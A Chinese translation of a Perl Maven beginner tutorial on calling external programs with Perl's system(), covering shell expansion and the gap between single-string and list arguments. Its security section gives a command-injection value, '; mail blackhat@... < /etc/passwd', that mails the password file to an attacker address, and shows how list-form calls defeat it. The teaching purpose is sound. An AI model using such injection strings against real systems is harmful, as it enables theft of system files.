---
title: "使用Perl的system运行外部程序"
timestamp: 2013-06-08T17:06:41
tags:
  - system
published: true
original: running-external-programs-from-perl
books:
  - beginner
author: szabgab
translator: terrencehan
---


很多情况下，需要把程序包装在Perl脚本中运行。

例如，我们可以用Perl来收集执行某个程序所需的参数。

或者也可以捕获其它命令行程序的输出，然后再基于它们做一些决策。

Perl提供了很多不同的解决方案。来看一下。


## system

`system`可能是最简单的。它最基本的形式就是以字符串传入你想执行的外部命令。

例如在Unix/Linux机器上有用来创建用户帐号的"adduser"命令。
你可以这样调用：

`/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo`

如果想从perl脚本里运行，可以按照下面的形式写：

```perl
  system('/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo');
```

这样会运行adduser命令，它的任何输出或错误都会最终显示在屏幕上。

你也可以先组装命令，下面两个例子都会给出同样的结果：

```perl
  my $cmd = '/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo';
  system($cmd);
```

```perl
  my $cmd = '/usr/sbin/adduser';
  $cmd .= ' --home /opt/bfoo';
  $cmd .= ' --gecos "Foo Bar" bfoo';
  system($cmd);
```

## 使用多参数的system

`system`可接收多个参数，所以可以这样改写上面的例子：
```perl
  my @cmd = ('/usr/sbin/adduser');
  push @cmd, '--home';
  push @cmd, '/opt/bfoo';
  push @cmd, '--gecos',
  push @cmd, 'Foo Bar',
  push @cmd, 'bfoo';
  system(@cmd);
```

在这种情况下上面的所有解决方案的结果都是一样的，但情况又不总是这样。

## Shell 扩展

假设你有一个用来检查文件的<b>checkfiles</b>程序。调用<b>checkfiles data1.txt data2.txt</b>或
<b>checkfiles data*.txt</b>可以检查所有以'data'开头并以'txt'作为扩展名的文件。
第二种执行程序的方法在Unix/Linux系统上会有效，shell会把'data*.txt'展开成所有匹配的文件名。当<b>checkfiles</b>执行的时候就已经有合适的文件列表：<b>checkfiles data1.txt data2.txt data42.txt database.txt</b>。而在Windows上因为命令行不会做这种扩展而没有效果，程序只是将'data*.txt'作为输入。

Perl脚本会如何处理？

Windows平台没有区别。但是在Unix/Linux系统上，如果在Perl脚本中使用单个字符串运行'checkfiles'程序：`system("checkfiles data*.txt")`，
那么Perl会将字符串传递给shell，由shell进行扩展，然后再将文件列表传递给'checkfiles'程序。
另一方面，如果你将命令和参数作为独立的字符串传递：`system("checkfiles", "data*.txt")`，那么perl会直接以'data*txt'作为单个参数（不做扩展)运行'checkfiles'程序。

如你所见，把单个字符串作为整个命令有它的优势。

但这种优势也是有代价的。

## 安全风险

如果输入源不可信（如从web或服务器日志文件），使用单个参数并传递整个命令来调用system可能会有安全风险。

假设从一个不可信源接收checkfiles的参数：

```perl
  my $param = get_from_a_web_form();
  my $cmd = "checkfiles $param";
  system($cmd);
```

用户键入'data*.txt'还好，`$cmd`会赋值成`checkfile data*.txt`。

但假如用户传递的是其它更‘聪明’的参数，你可能就会陷入麻烦。例如，如果用户输
`data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd`。
最终perl会得到如下命令：
`checkfile data*.txt; mail darkside@perlmaven.com &lt; /etc/passwd`.

shell会首先执行'checkfile data*.txt'，但之后会继续执行'mail...'命令。
这会把你的密码文件发送到darkside。

如果你的Perl脚本传递多个参数使用`system`，就可以避免这样的安全风险。假设Perl代码是这样的：

```perl
  my $param = get_from_a_web_form();
  my @cmd = ("checkfiles", $param);
  system(@cmd);
```

然后用户输入`data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd`，相应的perl脚本会运行
'checkfiles'程序，并向它传递一个参数:`data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd`。
此时shell不会扩展参数，也避免了shell的危险。'checkfiles'程序可能会提示找不到文件`data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd`，
但至少我们的密码文件是安全的。

## 总结和深入阅读

向`system`传递由一个字符串构成的命令是挺方便的，但是如果输入来自一个不可信任的源就可能会很容易的招致攻击。
这份危险可以通过首先按照一份<b>白名单</b>检查输入是否有效来规避。你也可以通过在#!行使用`-T`标志开启<b>taint模式</b>来强制
自己注意这些方面。

更多内容请参阅[system的文档](/perldoc/system)。

